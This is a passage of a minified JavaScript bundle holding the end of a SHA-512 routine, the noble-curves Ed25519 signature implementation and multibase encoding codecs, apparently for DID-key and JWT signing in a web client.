p=De.add3L(F,L,f);n=De.add3H(p,D,j,N),i=p|0}({h:n,l:i}=De.add(this.Ah|0,this.Al|0,n|0,i|0)),{h:s,l:o}=De.add(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l:c}=De.add(this.Ch|0,this.Cl|0,a|0,c|0),{h:u,l}=De.add(this.Dh|0,this.Dl|0,u|0,l|0),{h,l:d}=De.add(this.Eh|0,this.El|0,h|0,d|0),{h:g,l:y}=De.add(this.Fh|0,this.Fl|0,g|0,y|0),{h:m,l:b}=De.add(this.Gh|0,this.Gl|0,m|0,b|0),{h:A,l:_}=De.add(this.Hh|0,this.Hl|0,A|0,_|0),this.set(n,i,s,o,a,c,u,l,h,d,g,y,m,b,A,_)}roundClean(){Os.fill(0),ks.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}};const fP=FT(()=>new dP);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const V0=BigInt(0),F1=BigInt(1),pP=BigInt(2);function K0(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Q0(t){if(!K0(t))throw new Error("Uint8Array expected")}function Up(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const gP=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Y0(t){Q0(t);let e="";for(let r=0;r<t.length;r++)e+=gP[t[r]];return e}function j1(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?V0:BigInt("0x"+t)}const Zi={_0:48,_9:57,A:65,F:70,a:97,f:102};function Ow(t){if(t>=Zi._0&&t<=Zi._9)return t-Zi._0;if(t>=Zi.A&&t<=Zi.F)return t-(Zi.A-10);if(t>=Zi.a&&t<=Zi.f)return t-(Zi.a-10)}function q1(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,r=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const n=new Uint8Array(r);for(let i=0,s=0;i<r;i++,s+=2){const o=Ow(t.charCodeAt(s)),a=Ow(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}n[i]=o*16+a}return n}function mP(t){return j1(Y0(t))}function id(t){return Q0(t),j1(Y0(Uint8Array.from(t).reverse()))}function z1(t,e){return q1(t.toString(16).padStart(e*2,"0"))}function wm(t,e){return z1(t,e).reverse()}function Xi(t,e,r){let n;if(typeof e=="string")try{n=q1(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(K0(e))n=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=n.length;if(typeof r=="number"&&i!==r)throw new Error(t+" of length "+r+" expected, got "+i);return n}function kw(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];Q0(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}const $p=t=>typeof t=="bigint"&&V0<=t;function yP(t,e,r){return $p(t)&&$p(e)&&$p(r)&&e<=t&&t<r}function Xc(t,e,r,n){if(!yP(e,r,n))throw new Error("expected valid "+t+": "+r+" <= n < "+n+", got "+e)}function wP(t){let e;for(e=0;t>V0;t>>=F1,e+=1);return e}const bP=t=>(pP<<BigInt(t-1))-F1,vP={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||K0(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function J0(t,e,r={}){const n=(i,s,o)=>{const a=vP[s];if(typeof a!="function")throw new Error("invalid validator function");const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got "+c)};for(const[i,s]of Object.entries(e))n(i,s,!1);for(const[i,s]of Object.entries(r))n(i,s,!0);return t}function Dw(t){const e=new WeakMap;return(r,...n)=>{const i=e.get(r);if(i!==void 0)return i;const s=t(r,...n);return e.set(r,s),s}}const _r=BigInt(0),tr=BigInt(1),Oo=BigInt(2),EP=BigInt(3),bm=BigInt(4),Mw=BigInt(5),Bw=BigInt(8);function dr(t,e){const r=t%e;return r>=_r?r:e+r}function AP(t,e,r){if(e<_r)throw new Error("invalid exponent, negatives unsupported");if(r<=_r)throw new Error("invalid modulus");if(r===tr)return _r;let n=tr;for(;e>_r;)e&tr&&(n=n*t%r),t=t*t%r,e>>=tr;return n}function vi(t,e,r){let n=t;for(;e-- >_r;)n*=n,n%=r;return n}function Uw(t,e){if(t===_r)throw new Error("invert: expected non-zero number");if(e<=_r)throw new Error("invert: expected positive modulus, got "+e);let r=dr(t,e),n=e,i=_r,s=tr;for(;r!==_r;){const o=n/r,a=n%r,c=i-s*o;n=r,r=a,i=s,s=c}if(n!==tr)throw new Error("invert: does not exist");return dr(i,e)}function _P(t){const e=(t-tr)/Oo;let r,n,i;for(r=t-tr,n=0;r%Oo===_r;r/=Oo,n++);for(i=Oo;i<t&&AP(i,e,t)!==t-tr;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(n===1){const o=(t+tr)/bm;return function(a,c){const u=a.pow(c,o);if(!a.eql(a.sqr(u),c))throw new Error("Cannot find square root");return u}}const s=(r+tr)/Oo;return function(o,a){if(o.pow(a,e)===o.neg(o.ONE))throw new Error("Cannot find square root");let c=n,u=o.pow(o.mul(o.ONE,i),r),l=o.pow(a,s),h=o.pow(a,r);for(;!o.eql(h,o.ONE);){if(o.eql(h,o.ZERO))return o.ZERO;let d=1;for(let y=o.sqr(h);d<c&&!o.eql(y,o.ONE);d++)y=o.sqr(y);const g=o.pow(u,tr<<BigInt(c-d-1));u=o.sqr(g),l=o.mul(l,g),h=o.mul(h,u),c=d}return l}}function CP(t){if(t%bm===EP){const e=(t+tr)/bm;return function(r,n){const i=r.pow(n,e);if(!r.eql(r.sqr(i),n))throw new Error("Cannot find square root");return i}}if(t%Bw===Mw){const e=(t-Mw)/Bw;return function(r,n){const i=r.mul(n,Oo),s=r.pow(i,e),o=r.mul(n,s),a=r.mul(r.mul(o,Oo),s),c=r.mul(o,r.sub(a,r.ONE));if(!r.eql(r.sqr(c),n))throw new Error("Cannot find square root");return c}}return _P(t)}const IP=(t,e)=>(dr(t,e)&tr)===tr,xP=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function SP(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},r=xP.reduce((n,i)=>(n[i]="function",n),e);return J0(t,r)}function NP(t,e,r){if(r<_r)throw new Error("invalid exponent, negatives unsupported");if(r===_r)return t.ONE;if(r===tr)return e;let n=t.ONE,i=e;for(;r>_r;)r&tr&&(n=t.mul(n,i)),i=t.sqr(i),r>>=tr;return n}function TP(t,e){const r=new Array(e.length),n=e.reduce((s,o,a)=>t.is0(o)?s:(r[a]=s,t.mul(s,o)),t.ONE),i=t.inv(n);return e.reduceRight((s,o,a)=>t.is0(o)?s:(r[a]=t.mul(s,r[a]),t.mul(s,o)),i),r}function H1(t,e){const r=e!==void 0?e:t.toString(2).length,n=Math.ceil(r/8);return{nBitLength:r,nByteLength:n}}function W1(t,e,r=!1,n={}){if(t<=_r)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:s}=H1(t,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:t,isLE:r,BITS:i,BYTES:s,MASK:bP(i),ZERO:_r,ONE:tr,create:c=>dr(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return _r<=c&&c<t},is0:c=>c===_r,isOdd:c=>(c&tr)===tr,neg:c=>dr(-c,t),eql:(c,u)=>c===u,sqr:c=>dr(c*c,t),add:(c,u)=>dr(c+u,t),sub:(c,u)=>dr(c-u,t),mul:(c,u)=>dr(c*u,t),pow:(c,u)=>NP(a,c,u),div:(c,u)=>dr(c*Uw(u,t),t),sqrN:c=>c*c,addN:(c,u)=>c+u,subN:(c,u)=>c-u,mulN:(c,u)=>c*u,inv:c=>Uw(c,t),sqrt:n.sqrt||(c=>(o||(o=CP(t)),o(a,c))),invertBatch:c=>TP(a,c),cmov:(c,u,l)=>l?u:c,toBytes:c=>r?wm(c,s):z1(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return r?id(c):mP(c)}});return Object.freeze(a)}const $w=BigInt(0),Nh=BigInt(1);function Lp(t,e){const r=e.negate();return t?r:e}function G1(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function Fp(t,e){G1(t,e);const r=Math.ceil(e/t)+1,n=2**(t-1);return{windows:r,windowSize:n}}function PP(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((r,n)=>{if(!(r instanceof e))throw new Error("invalid point at index "+n)})}function RP(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((r,n)=>{if(!e.isValid(r))throw new Error("invalid scalar at index "+n)})}const jp=new WeakMap,V1=new WeakMap;function qp(t){return V1.get(t)||1}function OP(t,e){return{constTimeNegate:Lp,hasPrecomputes(r){return qp(r)!==1},unsafeLadder(r,n,i=t.ZERO){let s=r;for(;n>$w;)n&Nh&&(i=i.add(s)),s=s.double(),n>>=Nh;return i},precomputeWindow(r,n){const{windows:i,windowSize:s}=Fp(n,e),o=[];let a=r,c=a;for(let u=0;u<i;u++){c=a,o.push(c);for(let l=1;l<s;l++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(r,n,i){const{windows:s,windowSize:o}=Fp(r,e);let a=t.ZERO,c=t.BASE;const u=BigInt(2**r-1),l=2**r,h=BigInt(r);for(let d=0;d<s;d++){const g=d*o;let y=Number(i&u);i>>=h,y>o&&(y-=l,i+=Nh);const m=g,b=g+Math.abs(y)-1,A=d%2!==0,_=y<0;y===0?c=c.add(Lp(A,n[m])):a=a.add(Lp(_,n[b]))}return{p:a,f:c}},wNAFUnsafe(r,n,i,s=t.ZERO){const{windows:o,windowSize:a}=Fp(r,e),c=BigInt(2**r-1),u=2**r,l=BigInt(r);for(let h=0;h<o;h++){const d=h*a;if(i===$w)break;let g=Number(i&c);if(i>>=l,g>a&&(g-=u,i+=Nh),g===0)continue;let y=n[d+Math.abs(g)-1];g<0&&(y=y.negate()),s=s.add(y)}return s},getPrecomputes(r,n,i){let s=jp.get(n);return s||(s=this.precomputeWindow(n,r),r!==1&&jp.set(n,i(s))),s},wNAFCached(r,n,i){const s=qp(r);return this.wNAF(s,this.getPrecomputes(s,r,i),n)},wNAFCachedUnsafe(r,n,i,s){const o=qp(r);return o===1?this.unsafeLadder(r,n,s):this.wNAFUnsafe(o,this.getPrecomputes(o,r,i),n,s)},setWindowSize(r,n){G1(n,e),V1.set(r,n),jp.delete(r)}}}function kP(t,e,r,n){if(PP(r,t),RP(n,e),r.length!==n.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,s=wP(BigInt(r.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,c=new Array(a+1).fill(i),u=Math.floor((e.BITS-1)/o)*o;let l=i;for(let h=u;h>=0;h-=o){c.fill(i);for(let g=0;g<n.length;g++){const y=n[g],m=Number(y>>BigInt(h)&BigInt(a));c[m]=c[m].add(r[g])}let d=i;for(let g=c.length-1,y=i;g>0;g--)y=y.add(c[g]),d=d.add(y);if(l=l.add(d),h!==0)for(let g=0;g<o;g++)l=l.double()}return l}function DP(t){return SP(t.Fp),J0(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...H1(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}const Xn=BigInt(0),rn=BigInt(1),Th=BigInt(2),MP=BigInt(8),BP={zip215:!0};function UP(t){const e=DP(t);return J0(t,{hash:"function",a:"bigint",d:"bigint",randomBytes:"function"},{adjustScalarBytes:"function",domain:"function",uvRatio:"function",mapToCurve:"function"}),Object.freeze({...e})}function $P(t){const e=UP(t),{Fp:r,n,prehash:i,hash:s,randomBytes:o,nByteLength:a,h:c}=e,u=Th<<BigInt(a*8)-rn,l=r.create,h=W1(e.n,e.nBitLength),d=e.uvRatio||((p,w)=>{try{return{isValid:!0,value:r.sqrt(p*r.inv(w))}}catch{return{isValid:!1,value:Xn}}}),g=e.adjustScalarBytes||(p=>p),y=e.domain||((p,w,E)=>{if(Up("phflag",E),w.length||E)throw new Error("Contexts/pre-hash are not supported");return p});function m(p,w){Xc("coordinate "+p,w,Xn,u)}function b(p){if(!(p instanceof T))throw new Error("ExtendedPoint expected")}const A=Dw((p,w)=>{const{ex:E,ey:x,ez:R}=p,B=p.is0();w==null&&(w=B?MP:r.inv(R));const k=l(E*w),v=l(x*w),M=l(R*w);if(B)return{x:Xn,y:rn};if(M!==rn)throw new Error("invZ was invalid");return{x:k,y:v}}),_=Dw(p=>{const{a:w,d:E}=e;if(p.is0())throw new Error("bad point: ZERO");const{ex:x,ey:R,ez:B,et:k}=p,v=l(x*x),M=l(R*R),V=l(B*B),I=l(V*V),z=l(v*w),G=l(V*l(z+M)),W=l(I+l(E*l(v*M)));if(G!==W)throw new Error("bad point: equation left != right (1)");const K=l(x*R),ae=l(B*k);if(K!==ae)throw new Error("bad point: equation left != right (2)");return!0});class T{constructor(w,E,x,R){this.ex=w,this.ey=E,this.ez=x,this.et=R,m("x",w),m("y",E),m("z",x),m("t",R),Object.freeze(this)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static fromAffine(w){if(w instanceof T)throw new Error("extended point not allowed");const{x:E,y:x}=w||{};return m("x",E),m("y",x),new T(E,x,rn,l(E*x))}static normalizeZ(w){const E=r.invertBatch(w.map(x=>x.ez));return w.map((x,R)=>x.toAffine(E[R])).map(T.fromAffine)}static msm(w,E){return kP(T,h,w,E)}_setWindowSize(w){C.setWindowSize(this,w)}assertValidity(){_(this)}equals(w){b(w);const{ex:E,ey:x,ez:R}=this,{ex:B,ey:k,ez:v}=w,M=l(E*v),V=l(B*R),I=l(x*v),z=l(k*R);return M===V&&I===z}is0(){return this.equals(T.ZERO)}negate(){return new T(l(-this.ex),this.ey,this.ez,l(-this.et))}double(){const{a:w}=e,{ex:E,ey:x,ez:R}=this,B=l(E*E),k=l(x*x),v=l(Th*l(R*R)),M=l(w*B),V=E+x,I=l(l(V*V)-B-k),z=M+k,G=z-v,W=M-k,K=l(I*G),ae=l(z*W),ee=l(I*W),J=l(G*z);return new T(K,ae,J,ee)}add(w){b(w);const{a:E,d:x}=e,{ex:R,ey:B,ez:k,et:v}=this,{ex:M,ey:V,ez:I,et:z}=w;if(E===BigInt(-1)){const yn=l((B-R)*(V+M)),Ze=l((B+R)*(V-M)),We=l(Ze-yn);if(We===Xn)return this.double();const wn=l(k*Th*z),Xe=l(v*Th*I),He=Xe+wn,Kr=Ze+yn,et=Xe-wn,rt=l(He*We),Qi=l(Kr*et),ft=l(He*et),pt=l(We*Kr);return new T(rt,Qi,pt,ft)}const G=l(R*M),W=l(B*V),K=l(v*x*z),ae=l(k*I),ee=l((R+B)*(M+V)-G-W),J=ae-K,Te=ae+K,ie=l(W-E*G),ye=l(ee*J),Vr=l(Te*ie),ze=l(ee*ie),tt=l(J*Te);return new T(ye,Vr,tt,ze)}subtract(w){return this.add(w.negate())}wNAF(w){return C.wNAFCached(this,w,T.normalizeZ)}multiply(w){const E=w;Xc("scalar",E,rn,n);const{p:x,f:R}=this.wNAF(E);return T.normalizeZ([x,R])[0]}multiplyUnsafe(w,E=T.ZERO){const x=w;return Xc("scalar",x,Xn,n),x===Xn?S:this.is0()||x===rn?this:C.wNAFCachedUnsafe(this,x,T.normalizeZ,E)}isSmallOrder(){return this.multiplyUnsafe(c).is0()}isTorsionFree(){return C.unsafeLadder(this,n).is0()}toAffine(w){return A(this,w)}clearCofactor(){const{h:w}=e;return w===rn?this:this.multiplyUnsafe(w)}static fromHex(w,E=!1){const{d:x,a:R}=e,B=r.BYTES;w=Xi("pointHex",w,B),Up("zip215",E);const k=w.slice(),v=w[B-1];k[B-1]=v&-129;const M=id(k),V=E?u:r.ORDER;Xc("pointHex.y",M,Xn,V);const I=l(M*M),z=l(I-rn),G=l(x*I-R);let{isValid:W,value:K}=d(z,G);if(!W)throw new Error("Point.fromHex: invalid y coordinate");const ae=(K&rn)===rn,ee=(v&128)!==0;if(!E&&K===Xn&&ee)throw new Error("Point.fromHex: x=0 and x_0=1");return ee!==ae&&(K=l(-K)),T.fromAffine({x:K,y:M})}static fromPrivateKey(w){return D(w).point}toRawBytes(){const{x:w,y:E}=this.toAffine(),x=wm(E,r.BYTES);return x[x.length-1]|=w&rn?128:0,x}toHex(){return Y0(this.toRawBytes())}}T.BASE=new T(e.Gx,e.Gy,rn,l(e.Gx*e.Gy)),T.ZERO=new T(Xn,rn,rn,Xn);const{BASE:P,ZERO:S}=T,C=OP(T,a*8);function O(p){return dr(p,n)}function $(p){return O(id(p))}function D(p){const w=r.BYTES;p=Xi("private key",p,w);const E=Xi("hashed private key",s(p),2*w),x=g(E.slice(0,w)),R=E.slice(w,2*w),B=$(x),k=P.multiply(B),v=k.toRawBytes();return{head:x,prefix:R,scalar:B,point:k,pointBytes:v}}function F(p){return D(p).pointBytes}function j(p=new Uint8Array,...w){const E=kw(...w);return $(s(y(E,Xi("context",p),!!i)))}function L(p,w,E={}){p=Xi("message",p),i&&(p=i(p));const{prefix:x,scalar:R,pointBytes:B}=D(w),k=j(E.context,x,p),v=P.multiply(k).toRawBytes(),M=j(E.context,v,B,p),V=O(k+M*R);Xc("signature.s",V,Xn,n);const I=kw(v,wm(V,r.BYTES));return Xi("result",I,r.BYTES*2)}const N=BP;function f(p,w,E,x=N){const{context:R,zip215:B}=x,k=r.BYTES;p=Xi("signature",p,2*k),w=Xi("message",w),E=Xi("publicKey",E,k),B!==void 0&&Up("zip215",B),i&&(w=i(w));const v=id(p.slice(k,2*k));let M,V,I;try{M=T.fromHex(E,B),V=T.fromHex(p.slice(0,k),B),I=P.multiplyUnsafe(v)}catch{return!1}if(!B&&M.isSmallOrder())return!1;const z=j(R,V.toRawBytes(),M.toRawBytes(),w);return V.add(M.multiplyUnsafe(z)).subtract(I).clearCofactor().equals(T.ZERO)}return P._setWindowSize(8),{CURVE:e,getPublicKey:F,sign:L,verify:f,ExtendedPoint:T,utils:{getExtendedPublicKey:D,randomPrivateKey:()=>o(r.BYTES),precompute(p=8,w=T.BASE){return w._setWindowSize(p),w.multiply(BigInt(3)),w}}}}BigInt(0),BigInt(1);const Z0=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949"),Lw=BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");BigInt(0);const LP=BigInt(1),Fw=BigInt(2);BigInt(3);const FP=BigInt(5),jP=BigInt(8);function qP(t){const e=BigInt(10),r=BigInt(20),n=BigInt(40),i=BigInt(80),s=Z0,o=t*t%s*t%s,a=vi(o,Fw,s)*o%s,c=vi(a,LP,s)*t%s,u=vi(c,FP,s)*c%s,l=vi(u,e,s)*u%s,h=vi(l,r,s)*l%s,d=vi(h,n,s)*h%s,g=vi(d,i,s)*d%s,y=vi(g,i,s)*d%s,m=vi(y,e,s)*u%s;return{pow_p_5_8:vi(m,Fw,s)*t%s,b2:o}}function zP(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}function HP(t,e){const r=Z0,n=dr(e*e*e,r),i=dr(n*n*e,r),s=qP(t*i).pow_p_5_8;let o=dr(t*n*s,r);const a=dr(e*o*o,r),c=o,u=dr(o*Lw,r),l=a===t,h=a===dr(-t,r),d=a===dr(-t*Lw,r);return l&&(o=c),(h||d)&&(o=u),IP(o,r)&&(o=dr(-o,r)),{isValid:l||h,value:o}}const WP=W1(Z0,void 0,!0),GP={a:BigInt(-1),d:BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),Fp:WP,n:BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),h:jP,Gx:BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),Gy:BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),hash:fP,randomBytes:$1,adjustScalarBytes:zP,uvRatio:HP},K1=$P(GP),VP="EdDSA",KP="JWT",Td=".",Af="base64url",Q1="utf8",Y1="utf8",QP=":",YP="did",JP="key",jw="base58btc",ZP="z",XP="K36",eR=32;function X0(t){return globalThis.Buffer!=null?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t}function J1(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?X0(globalThis.Buffer.allocUnsafe(t)):new Uint8Array(t)}function Z1(t,e){e||(e=t.reduce((i,s)=>i+s.length,0));const r=J1(e);let n=0;for(const i of t)r.set(i,n),n+=i.length;return X0(r)}function tR(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var r=new Uint8Array(256),n=0;n<r.length;n++)r[n]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(r[o]!==255)throw new TypeError(s+" is ambiguous");r[o]=i}var a=t.length,c=t.charAt(0),u=Math.log(a)/Math.log(256),l=Math.log(256)/Math.log(a);function h(y){if(y instanceof Uint8Array||(ArrayBuffer.isView(y)?y=new Uint8Array(y.buffer,y.byteOffset,y.byteLength):Array.isArray(y)&&(y=Uint8Array.from(y))),!(y instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(y.length===0)return"";for(var m=0,b=0,A=0,_=y.length;A!==_&&y[A]===0;)A++,m++;for(var T=(_-A)*l+1>>>0,P=new Uint8Array(T);A!==_;){for(var S=y[A],C=0,O=T-1;(S!==0||C<b)&&O!==-1;O--,C++)S+=256*P[O]>>>0,P[O]=S%a>>>0,S=S/a>>>0;if(S!==0)throw new Error("Non-zero carry");b=C,A++}for(var $=T-b;$!==T&&P[$]===0;)$++;for(var D=c.repeat(m);$<T;++$)D+=t.charAt(P[$]);return D}function d(y){if(typeof y!="string")throw new TypeError("Expected String");if(y.length===0)return new Uint8Array;var m=0;if(y[m]!==" "){for(var b=0,A=0;y[m]===c;)b++,m++;for(var _=(y.length-m)*u+1>>>0,T=new Uint8Array(_);y[m];){var P=r[y.charCodeAt(m)];if(P===255)return;for(var S=0,C=_-1;(P!==0||S<A)&&C!==-1;C--,S++)P+=a*T[C]>>>0,T[C]=P%256>>>0,P=P/256>>>0;if(P!==0)throw new Error("Non-zero carry");A=S,m++}if(y[m]!==" "){for(var O=_-A;O!==_&&T[O]===0;)O++;for(var $=new Uint8Array(b+(_-O)),D=b;O!==_;)$[D++]=T[O++];return $}}}function g(y){var m=d(y);if(m)return m;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:d,decode:g}}var rR=tR,nR=rR;const X1=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},iR=t=>new TextEncoder().encode(t),sR=t=>new TextDecoder().decode(t);let oR=class{constructor(e,r,n){this.name=e,this.prefix=r,this.baseEncode=n}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}},aR=class{constructor(e,r,n){if(this.name=e,this.prefix=r,r.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=r.codePointAt(0),this.baseDecode=n}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return e_(this,e)}},cR=class{constructor(e){this.decoders=e}or(e){return e_(this,e)}decode(e){const r=e[0],n=this.decoders[r];if(n)return n.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}};const e_=(t,e)=>new cR({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});let uR=class{constructor(e,r,n,i){this.name=e,this.prefix=r,this.baseEncode=n,this.baseDecode=i,this.encoder=new oR(e,r,n),this.decoder=new aR(e,r,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}};const _f=({name:t,prefix:e,encode:r,decode:n})=>new uR(t,e,r,n),Ql=({prefix:t,name:e,alphabet:r})=>{const{encode:n,decode:i}=nR(r,e);return _f({prefix:t,name:e,encode:n,decode:s=>X1(i(s))})},lR=(t,e,r,n)=>{const i={};for(let l=0;l<e.length;++l)i[e[l]]=l;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*r/8|0);let a=0,c=0,u=0;for(let l=0;l<s;++l){const h=i[t[l]];if(h===void 0)throw new SyntaxError(`Non-${n} character`);c=c<<r|h,a+=r,a>=8&&(a-=8,o[u++]=255&c>>a)}if(a>=r||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},hR=(t,e,r)=>{const n=e[e.length-1]==="=",i=(1<<r)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>r;)o-=r,s+=e[i&a>>o];if(o&&(s+=e[i&a<<r-o]),n)for(;s.length*r&7;)s+="=";return s},Br=({name:t,prefix:e,bitsPerChar:r,alphabet:n})=>_f({prefix:e,name:t,encode(i){return hR(i,n,r)},decode(i){return lR(i,n,r,t)}}),dR=_f({prefix:"\0",name:"identity",encode:t=>sR(t),decode:t=>iR(t)});var fR=Object.freeze({__proto__:null,identity:dR});const pR=Br({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var gR=Object.freeze({__proto__:null,base2:pR});const mR=Br({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var yR=Object.freeze({__proto__:null,base8:mR});const wR=Ql({prefix:"9",name:"base10",alphabet:"0123456789"});var bR=Object.freeze({__proto__:null,base10:wR});const vR=Br({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),ER=Br({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var AR=Object.freeze({__proto__:null,base16:vR,base16upper:ER});const _R=Br({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),CR=Br({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),IR=Br({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),xR=Br({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),SR=Br({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),NR=Br({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),TR=Br({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),PR=Br({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),RR=Br({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var OR=Object.freeze({__proto__:null,base32:_R,base32upper:CR,base32pad:IR,base32padupper:xR,base32hex:SR,base32hexupper:NR,base32hexpad:TR,base32hexpadupper:PR,base32z:RR});const kR=Ql({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),DR=Ql({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var MR=Object.freeze({__proto__:null,base36:kR,base36upper:DR});const BR=Ql({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),UR=Ql({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var $R=Object.freeze({__proto__:null,base58btc:BR,base58flickr:UR});const LR=Br({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),FR=Br({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),jR=Br({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),qR=Br({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var zR=Object.freeze({__proto__:null,base64:LR,base64pad:FR,base64url:jR,base64urlpad:qR});const t_=Array.from(""),HR=t_.reduce((t,e,r)=>(t[r]=e,t),[]),WR=t_.reduce((t,e,r)=>(t[e.codePointAt(0)]=r,t),[]);function GR(t){return t.reduce((e,r)=>(e+=HR[r],e),"")}function VR(t){const 